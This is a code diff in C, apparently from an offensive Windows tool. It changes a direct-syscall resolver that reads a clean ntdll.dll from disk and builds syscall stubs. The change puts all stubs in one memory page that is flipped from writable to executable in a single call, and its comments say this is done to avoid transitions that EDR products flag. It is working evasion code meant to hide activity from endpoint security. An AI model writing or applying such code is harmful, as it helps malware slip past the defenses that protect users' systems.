@@ -31,18 +31,19 @@ static DWORD NameHash(PCHAR str) {
     return hash;
 }
 
-// Create a syscall stub in heap memory
+// Single page for all stubs — avoids multiple RW→RX transitions that EDR flags
+static PBYTE g_StubPage = NULL;
+static DWORD g_StubOffset = 0;
+
+// Create a syscall stub inside the shared stub page
 // stub:  mov r10, rcx  →  4C 8B D1
 //        mov eax, <N>  →  B8 XX XX XX XX
 //        syscall       →  0F 05
 //        ret           →  C3
 PVOID CreateSyscallStub(DWORD syscallNumber) {
-    // Allocate RW memory for the stub
-    SIZE_T stubSize = 12; // 4 + 5 + 2 + 1 = 12 bytes
-    PVOID stub = VirtualAlloc(NULL, stubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!stub) return NULL;
+    if (!g_StubPage) return NULL;
 
-    PBYTE code = (PBYTE)stub;
+    PBYTE code = g_StubPage + g_StubOffset;
     // mov r10, rcx
     code[0] = 0x4C;
     code[1] = 0x8B;
@@ -57,15 +58,25 @@ PVOID CreateSyscallStub(DWORD syscallNumber) {
     code[10] = 0xC3;
     code[11] = 0x90; // nop padding
 
-    // Change to RX (not RWX — no simultaneous write+execute)
-    DWORD oldProtect;
-    VirtualProtect(stub, stubSize, PAGE_EXECUTE_READ, &oldProtect);
+    g_StubOffset += 12;
+    return code;
+}
 
-    return stub;
+// Finalize: change the shared page from RW to RX in one call
+static void FinalizeStubs(void) {
+    if (g_StubPage && g_StubOffset > 0) {
+        DWORD old;
+        VirtualProtect(g_StubPage, 4096, PAGE_EXECUTE_READ, &old);
+    }
 }
 
 // Read clean ntdll.dll from disk, walk export table, extract syscall numbers
 BOOL InitSyscallResolver(void) {
+    // Pre-allocate one shared page for all stubs (avoids N×RW→RX EDR triggers)
+    g_StubPage = (PBYTE)VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!g_StubPage) return FALSE;
+    g_StubOffset = 0;
+
     WCHAR sysDir[MAX_PATH];
     if (!GetSystemDirectoryW(sysDir, MAX_PATH)) return FALSE;
 
@@ -147,6 +158,9 @@ BOOL InitSyscallResolver(void) {
     UnmapViewOfFile(base);
     CloseHandle(hMapping);
     CloseHandle(hFile);
+
+    // Finalize: change shared page from RW to RX in ONE call (not N calls)
+    FinalizeStubs();
 
     return resolvedCount > 0;
 }
